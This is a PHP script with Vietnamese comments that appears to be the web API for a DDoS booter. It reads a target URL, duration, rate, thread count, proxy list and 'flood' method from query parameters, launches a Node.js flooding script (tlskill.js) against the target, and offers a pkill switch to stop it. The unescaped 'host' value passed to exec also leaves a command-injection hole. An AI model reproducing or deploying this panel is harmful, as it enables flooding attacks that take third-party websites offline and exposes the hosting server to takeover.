<?php

// Thêm đường dẫn vào PATH để đảm bảo PHP có thể tìm thấy các lệnh
putenv('PATH=' . getenv('PATH') . ':/usr/bin:/usr/local/bin');

// Kiểm tra và in ra giá trị của PATH để kiểm tra đường dẫn
echo "PATH: " . getenv('PATH') . "<br>";

// Thông tin về hệ điều hành
$os = php_uname();
echo "Hệ điều hành: " . $os . "<br>";

// Thông tin về RAM và CPU
$total_ram = shell_exec('free -h | grep Mem | awk \'{print $2}\'');
$total_cpu = shell_exec('nproc');
echo "Tổng RAM: " . trim($total_ram) . "<br>";
echo "Tổng CPU: " . trim($total_cpu) . " cores<br>";

// Thông tin về Node.js
$nodePath = shell_exec('which node');
if ($nodePath) {
    echo "Node.js được tìm thấy tại: " . $nodePath . "<br>";
    $nodeVersion = shell_exec('node -v');
    echo "Phiên bản Node.js: " . $nodeVersion . "<br>";
} else {
    echo "Node.js không được tìm thấy!<br>";
}

// Thông tin về Python
$pythonPath = shell_exec('which python3');
if ($pythonPath) {
    echo "Python được tìm thấy tại: " . $pythonPath . "<br>";
    $pythonVersion = shell_exec('python3 --version');
    echo "Phiên bản Python: " . $pythonVersion . "<br>";
} else {
    echo "Python không được tìm thấy!<br>";
}

// Thông tin về Web Server (nginx/apache)
$webServer = '';
if (file_exists('/etc/nginx/nginx.conf')) {
    $webServer = 'nginx';
} elseif (file_exists('/etc/apache2/apache2.conf')) {
    $webServer = 'apache';
} else {
    $webServer = 'Không xác định';
}
echo "Web Server: " . $webServer . "<br>";

// Đường dẫn chứa file api.php
$scriptPath = __FILE__;
echo "Đường dẫn đến api.php: " . $scriptPath . "<br>";

// Nếu tham số 'pkill' được truyền vào, thực hiện lệnh pkill
if (isset($_GET['pkill']) && $_GET['pkill'] === 'true') {
    echo "Đang thực hiện lệnh pkill -f -9 tlskill...<br>";

    // Xác định PID của tiến trình tlskill trước khi pkill
    $pids_before = shell_exec("pgrep -f tlskill");
    echo "Các PID của tiến trình tlskill trước khi pkill:<br><pre>" . $pids_before . "</pre><br>";

    // Thực thi lệnh pkill
    $pkillOutput = shell_exec('pkill -f -9 tlskill');

    // Kiểm tra các PID sau khi pkill
    $pids_after = shell_exec("pgrep -f tlskill");
    if (empty($pids_after)) {
        echo "Các tiến trình tlskill đã bị tắt thành công.<br>";
    } else {
        echo "Các tiến trình tlskill vẫn còn chạy. Các PID còn lại: <br><pre>" . $pids_after . "</pre><br>";
    }

    exit;
}

// Lấy giá trị các tham số từ URL và bảo mật chúng
$host = isset($_GET['host']) ? trim($_GET['host']) : null;  // Đảm bảo không có khoảng trắng thừa
$time = isset($_GET['time']) ? escapeshellarg($_GET['time']) : '200';  // Mặc định 200 giây
$rate = isset($_GET['rate']) ? escapeshellarg($_GET['rate']) : '10';  // Mặc định 20
$threads = isset($_GET['threads']) ? escapeshellarg($_GET['threads']) : '10';  // Mặc định 10
$proxy = isset($_GET['proxy']) ? escapeshellarg($_GET['proxy']) : 'live.txt';  // Mặc định live.txt
$methods = isset($_GET['methods']) ? escapeshellarg($_GET['methods']) : 'flood';  // Mặc định flood

// Kiểm tra xem tham số 'host' có được cung cấp không và có đúng định dạng không
if (!$host) {
    echo "Thiếu tham số 'host'. Vui lòng cung cấp 'host' ví dụ: api.php?host=hostsite<br>";
    exit;
}

// Kiểm tra định dạng của host (phải bắt đầu với http:// hoặc https://)
if (!preg_match("/^https?:\/\//", $host)) {
    echo "Lỗi: Tham số 'host' phải bắt đầu bằng 'http://' hoặc 'https://'. Vui lòng kiểm tra lại.<br>";
    exit;
}

// Kiểm tra sự tồn tại của file tlskill.js trước khi chạy
$tlskillFile = '/var/www/html/tlskill.js';
if (!file_exists($tlskillFile)) {
    echo "File tlskill.js không tồn tại! Vui lòng kiểm tra lại đường dẫn đến file.<br>";
    exit;
}

// Lệnh Node.js với các tham số từ URL
$command = "/usr/bin/node $tlskillFile $host $time $rate $threads $proxy $methods";

// Kiểm tra lỗi ngay lập tức và phản hồi ngay
exec($command . ' 2>&1', $output, $return_var);

// Kiểm tra nếu có lỗi từ lệnh Node.js (stderr)
if ($return_var !== 0) {
    // Lỗi được in ra ngay lập tức nếu có
    echo "Lỗi khi chạy lệnh Node.js:<br><pre>" . implode("\n", $output) . "</pre><br>";
    exit;
}

// Nếu lệnh chạy thành công, phản hồi ngay lập tức
echo "Lệnh đã được gửi đi và đang chạy trong nền. Kết quả sẽ được ghi vào file log.<br>";

// Đọc kết quả từ file log nếu có
$log_output = file_get_contents('/var/www/html/tlskill_output.log');
if (!empty($log_output)) {
    echo "Kết quả log từ file:<br><pre>" . $log_output . "</pre><br>";
}

?>
